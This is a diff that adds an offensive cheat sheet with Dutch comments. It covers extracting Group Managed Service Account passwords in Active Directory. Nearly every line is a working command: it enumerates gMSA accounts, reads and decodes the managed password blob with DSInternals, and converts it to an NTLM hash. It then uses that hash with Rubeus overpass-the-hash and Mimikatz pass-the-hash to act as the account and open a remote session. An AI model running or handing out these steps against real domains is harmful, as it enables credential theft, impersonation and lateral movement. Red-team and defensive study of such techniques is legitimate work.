@@ -1,0 +1,37 @@
+# gMSA — Group Managed Service Account wachtwoord extractie
+# Lees het beheerde wachtwoord van een gMSA en converteer naar NTLM hash
+
+# === Enumeratie ===
+
+# Alle gMSA accounts in het domein
+Get-ADServiceAccount -Filter * -Properties *
+
+# Wie mag het wachtwoord lezen?
+Get-ADServiceAccount -Identity TARGET_GMSA -Properties * | select PrincipalsAllowedToRetrieveManagedPassword
+
+# === Wachtwoord extractie (vereist: leesrechten op gMSA) ===
+
+# Stap 1: Lees de managed password blob
+$Passwordblob = (Get-ADServiceAccount -Identity TARGET_GMSA -Properties msDS-ManagedPassword).'msDS-ManagedPassword'
+
+# Stap 2: Decodeer met DSInternals
+Import-Module DSInternals
+$decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob
+
+# Stap 3: Converteer naar NTLM hash
+ConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword
+
+# === Gebruik ===
+
+# Overpass-the-Hash met de NTLM hash
+Rubeus.exe asktgt /user:TARGET_GMSA /rc4:HASH /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+
+# Of via Invoke-Mimi
+Invoke-Mimi -Command '"sekurlsa::pth /user:TARGET_GMSA /domain:DOMAIN /ntlm:HASH /run:powershell.exe"'
+
+# PSRemoting als de gMSA
+Enter-PSSession -ComputerName TARGET
+
+# Noot: gMSA wachtwoorden roteren automatisch (standaard elke 30 dagen)
+# Noot: DSInternals module nodig: Install-Module DSInternals
+# Noot: Alleen principals in PrincipalsAllowedToRetrieveManagedPassword kunnen het wachtwoord lezen
